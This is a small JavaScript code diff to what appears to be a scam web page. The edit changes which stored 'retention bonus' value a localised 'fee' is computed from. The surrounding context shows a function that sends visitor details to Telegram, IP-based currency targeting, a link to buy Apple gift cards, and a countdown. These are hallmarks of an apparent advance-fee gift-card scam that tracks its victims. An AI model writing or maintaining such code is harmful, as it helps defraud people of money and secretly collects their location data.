@@ -458,11 +458,12 @@ async function sendVisitorDetailsToTelegram(ipData) {
 // 3. IP-BASED LOCALIZATION & STOREFRONT ROUTING
 // ==========================================
 function loadLocalizedFee(ipData) {
-    const rawValue = localStorage.getItem("av_retention_bonus") || 0;
+    // 🎯 REPLACED WITH NEW SNAPSHOT KEY (falls back to av_retention_bonus if snap is not yet set)
+    const rawValue = localStorage.getItem("av_snap_retention_bonus") || localStorage.getItem("av_retention_bonus") || 0;
     const baseAmount = parseFloat(rawValue);
 
     const countryCode = (ipData.country_code || 'US').toUpperCase();
-    
+
     let targetCurrency = ipData.currency || 'USD';
     let regionLabel = `${ipData.country_name || 'United States'} (${targetCurrency})`;
     let localeString = 'en-US';
@@ -506,6 +507,7 @@ function loadLocalizedFee(ipData) {
         if (appleLink) appleLink.href = "https://www.apple.com/shop/buy-giftcard/giftcard";
     }
 }
+
 
 // ==========================================
 // 4. COUNTDOWN & TELEGRAM LIVE BUTTON STREAMING
